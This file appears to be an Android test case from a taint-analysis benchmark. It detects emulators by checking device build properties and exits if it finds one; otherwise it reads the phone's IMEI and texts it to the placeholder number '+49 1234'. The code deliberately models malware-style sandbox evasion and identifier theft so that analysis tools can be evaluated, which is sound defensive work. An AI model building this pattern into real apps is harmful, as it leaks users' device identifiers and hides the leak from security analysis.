
package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
/**
 * @testcase_name EmulatorConstants2
 * Includes some string manipulations
 * 
 * Similar to the 001_Gunpoder-5399eec9a6d87ef6ecc5df31b59b4b81/com/paypal/android/sdk/aW.java:437
 */
public class EmulatorConstants2 extends Activity {
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("IBM", "start");
        setContentView(R.layout.emulator_constants2);
		
        String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
    	
        boolean getOut = false;
        if ((Build.BRAND.toLowerCase().contains("generic")) || (Build.HARDWARE.equals("goldfish")) || (Build.FINGERPRINT.startsWith("generic")) || (Build.MANUFACTURER.equals("unknown"))) {
        	Log.d("IBM", "-> 1");
        	getOut=true;
          }
        if (Build.PRODUCT.matches(".*_?sdk_?.*")) {
        	Log.d("IBM", "-> 2");
        	getOut=true;
          }
         if ((Build.TAGS == null) || (Build.TAGS.contains("test-keys"))) {
        	 Log.d("IBM", "-> 3");
        	 getOut=true;
          }

         if (getOut){
         	System.exit(0);
         }
  		SmsManager sms = SmsManager.getDefault();
  		Log.d("IBM", "sending SMS: "+imei);
  		sms.sendTextMessage("+49 1234", null, imei, null, null);  //sink        
		Log.d("IBM", "end");
	}    
}
